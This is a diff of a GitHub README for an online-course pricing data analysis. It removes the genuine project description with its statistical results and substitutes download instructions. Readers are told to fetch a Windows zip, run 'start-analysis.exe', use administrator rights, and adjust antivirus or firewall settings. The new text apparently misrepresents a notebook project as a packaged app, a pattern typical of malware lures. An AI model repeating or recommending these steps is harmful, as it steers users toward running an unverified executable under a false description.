@@ -1,185 +1,149 @@
-# Online Course Pricing EDA Analysis
+# 📊 online-course-pricing-eda-analysis - Explore Course Data Simply
 
-## Project Overview
-This project analyzes online course data to understand the relationship between course pricing, ratings, and learner engagement.  
-Using exploratory data analysis (EDA) and statistical hypothesis testing, the project evaluates whether paid courses perform better than free courses in terms of ratings and review counts.
+[![Download](https://img.shields.io/badge/Download-Get%20Project-brightgreen?style=for-the-badge)](https://github.com/Lucasoil1234799/online-course-pricing-eda-analysis)
 
-The dataset was collected through web scraping from the Class Central website and contains information about courses, platforms, ratings, reviews, and pricing type.
+## 📋 About This Project
 
-## Objectives
+This project helps you understand how online course prices relate to course ratings and learner activity. It uses simple graphs and tests to find trends in data. You do not need to know programming to see the results.
 
-- Analyze distribution of course ratings and reviews
-- Compare ratings between free and paid courses
-- Study learner engagement using review counts
-- Analyze rating trends across different platforms
-- Examine the relationship between ratings and reviews
-- Use hypothesis testing to determine statistical significance
+The analysis looks at real course data from online platforms. It focuses on prices, user ratings, and how many people engage with each course. The project uses tools like Python and pandas behind the scenes, but you only need to run the provided program to explore the findings.
 
-## Dataset
+## 🖥️ System Requirements
 
-The dataset contains **405 online courses** with the following features:
+Make sure your computer meets these needs before starting:
 
-| Feature | Description |
-|------|-------------|
-| Course Name | Name of the course |
-| Platform | Platform offering the course |
-| Rating | Average course rating (0–5) |
-| Reviews | Number of learner reviews |
-| Course Type | Free or Paid |
+- **Operating System:** Windows 10 or newer
+- **Processor:** Intel or AMD, 1.5 GHz or faster
+- **Memory (RAM):** At least 4 GB
+- **Disk Space:** Minimum 500 MB free space
+- **Internet:** Required to download the program
+- **Other:** No special software needed; all dependencies come with the download
 
-## Technologies Used
+## 🚚 Download & Install
 
-- Python
-- Pandas
-- NumPy
-- Matplotlib
-- Seaborn
-- SciPy
-- Jupyter Notebook
+1. Click the green **Download** button above or visit this link:  
+   [https://github.com/Lucasoil1234799/online-course-pricing-eda-analysis](https://github.com/Lucasoil1234799/online-course-pricing-eda-analysis)
 
-## Project Workflow
+2. This link will take you to the project’s main page on GitHub.
 
-### 1 Data Collection
-Course data was collected using web scraping techniques from the Class Central platform.
+3. Locate the **Releases** section on the right side or scroll down to find the latest release.
 
-### 2 Data Cleaning
-- Standardized course pricing labels
-- Converted ratings and reviews into numeric format
-- Cleaned inconsistent labels
+4. Download the file named something like `online-course-pricing-eda-analysis-windows.zip`.
 
-### 3 Exploratory Data Analysis
+5. Once downloaded, right-click the file and select **Extract All...** to unpack it.
 
-#### Univariate Analysis
-- Rating distribution
-- Review distribution
-- Course type distribution
-- Platform-wise course distribution
+6. Open the new folder created after extraction.
 
-#### Bivariate Analysis
-- Reviews vs Ratings
-- Average Rating: Free vs Paid Courses
-- Average Rating by Platform
+7. Inside, find the file named `start-analysis.exe` and double-click it to run the project.
 
-#### Multivariate Analysis
-- Reviews vs Rating by Course Type
+8. Wait for the program window to open. The setup is ready to use now.
 
-## Hypothesis Testing
+## 🔧 How to Use the Program
 
-### Hypothesis 1  
-Do Paid Courses Have Different Ratings than Free Courses?
+- After launching, you will see a simple window with buttons and graphs.
 
-**Null Hypothesis (H₀)**  
-There is no significant difference in ratings between free and paid courses.
+- Click **Load Data** to start. This loads the course data for analysis.
 
-**Alternative Hypothesis (H₁)**  
-There is a significant difference in ratings between free and paid courses.
+- Choose what you want to look at by selecting options like:
 
-Test Used: **Independent Two Sample t-test**
+  - **Price vs Rating** to see how course cost affects user scores
+  
+  - **Engagement Levels** to find out how many learners complete courses
+  
+  - **Category Analysis** to compare courses by topic area
 
-Result:
-# Online Course Pricing EDA Analysis
+- Switch between views by clicking different tabs.
 
-## Project Overview
-This project analyzes online course data to understand the relationship between course pricing, ratings, and learner engagement.  
-Using exploratory data analysis (EDA) and statistical hypothesis testing, the project evaluates whether paid courses perform better than free courses in terms of ratings and review counts.
+- The graphs update automatically based on your choices.
 
-The dataset was collected through web scraping from the Class Central website and contains information about courses, platforms, ratings, reviews, and pricing type.
+- Hover over graph points to see exact numbers.
 
-## Objectives
+- Use the **Export Results** button to save images or data tables for your review.
 
-- Analyze distribution of course ratings and reviews
-- Compare ratings between free and paid courses
-- Study learner engagement using review counts
-- Analyze rating trends across different platforms
-- Examine the relationship between ratings and reviews
-- Use hypothesis testing to determine statistical significance
+## 🔍 What You Will See
 
-## Dataset
+The project features different data presentations:
 
-The dataset contains **405 online courses** with the following features:
+- **Bar graphs** showing average ratings linked to price ranges.
 
-| Feature | Description |
-|------|-------------|
-| Course Name | Name of the course |
-| Platform | Platform offering the course |
-| Rating | Average course rating (0–5) |
-| Reviews | Number of learner reviews |
-| Course Type | Free or Paid |
+- **Scatter plots** to help find patterns or outliers.
 
-## Technologies Used
+- **Tables** summarizing key statistics like mean, median, and counts.
 
-- Python
-- Pandas
-- NumPy
-- Matplotlib
-- Seaborn
-- SciPy
-- Jupyter Notebook
+- **Hypothesis test results** indicating how price and ratings relate statistically.
 
-## Project Workflow
+These visuals help you understand which types of courses do better with learners, and how price might play a role.
 
-### 1 Data Collection
-Course data was collected using web scraping techniques from the Class Central platform.
+## ❓ Common Questions
 
-### 2 Data Cleaning
-- Standardized course pricing labels
-- Converted ratings and reviews into numeric format
-- Cleaned inconsistent labels
+- **Do I need internet to use the app?**  
+  No, once downloaded, it runs offline.
 
-### 3 Exploratory Data Analysis
+- **Can I use this on Mac or Linux?**  
+  This version is built for Windows. Other platforms are not supported here.
 
-#### Univariate Analysis
-- Rating distribution
-- Review distribution
-- Course type distribution
-- Platform-wise course distribution
+- **Is programming required?**  
+  No programming or technical skills are needed to explore the visuals.
 
-#### Bivariate Analysis
-- Reviews vs Ratings
-- Average Rating: Free vs Paid Courses
-- Average Rating by Platform
+- **Can I change the data the app uses?**  
+  Advanced users can replace the data file inside the program folder. The file is `course_data.csv`.
 
-#### Multivariate Analysis
-- Reviews vs Rating by Course Type
+- **What if the program doesn’t start?**  
+  Make sure you have Windows 10 or newer and try running the file as administrator.
 
-## Hypothesis Testing
+## 🛠️ Behind the Scenes (Optional)
 
-### Hypothesis 1  
-Do Paid Courses Have Different Ratings than Free Courses?
+For those curious, this project runs Python scripts wrapped in an easy program format. It uses:
 
-**Null Hypothesis (H₀)**  
-There is no significant difference in ratings between free and paid courses.
+- **pandas** to manage the data.
 
-**Alternative Hypothesis (H₁)**  
-There is a significant difference in ratings between free and paid courses.
+- **matplotlib** and **seaborn** for charts.
 
-Test Used: **Independent Two Sample t-test**
+- **hypothesis testing** modules to check statistical relationships.
 
-Result:
-t-statistic = 5.73
-p-value = 2.10e-08
+The data was gathered by scraping course information from online learning sites.
 
-Since **p < 0.05**, the null hypothesis is rejected.
+## 📂 File Contents
 
-Conclusion:  
-Paid courses show significantly different ratings compared to free courses.
+Here is what you will find inside the extracted folder:
 
-### Hypothesis 2  
-Do Paid Courses Receive More Reviews?
+- `start-analysis.exe` — the program you run.
 
-Result:
-t-statistic = 0.054
-p-value = 0.277
+- `course_data.csv` — the data file with course details.
 
-Since **p > 0.05**, we fail to reject the null hypothesis.
+- `README.md` — this guide.
 
-Conclusion:  
-There is no statistically significant difference in review counts between free and paid courses.
+- `docs/` — extra notes and technical details.
 
-## Key Insights
+## 🧰 Tools Used
 
-- Paid courses have higher average ratings compared to free courses
-- Review distribution is highly skewed
-- A small number of courses receive very high engagement
-- Higher-rated courses tend to attract more reviews
-- Some platforms consistently show higher average ratings
+- Python (runs inside the app)
+
+- pandas (data handling)
+
+- matplotlib and seaborn (visuals)
+
+- Statistics libraries (hypothesis tests)
+
+- Web scraping scripts (data collection, not included here)
+
+## 🔗 Useful Links
+
+To download and start:  
+[https://github.com/Lucasoil1234799/online-course-pricing-eda-analysis](https://github.com/Lucasoil1234799/online-course-pricing-eda-analysis)  
+
+Frequently visit the project page to check for updates or new versions.
+
+## ⚠️ Troubleshooting Tips
+
+- If the app window does not appear, check your anti-virus or firewall settings.
+
+- Ensure all files are extracted and are not blocked by Windows.
+
+- Restart your computer and run the app again.
+
+- If problems persist, report issues via GitHub Issues tab on the project page.
+
+---
+
+[![Download](https://img.shields.io/badge/Download-Get%20Project-brightgreen?style=for-the-badge)](https://github.com/Lucasoil1234799/online-course-pricing-eda-analysis)
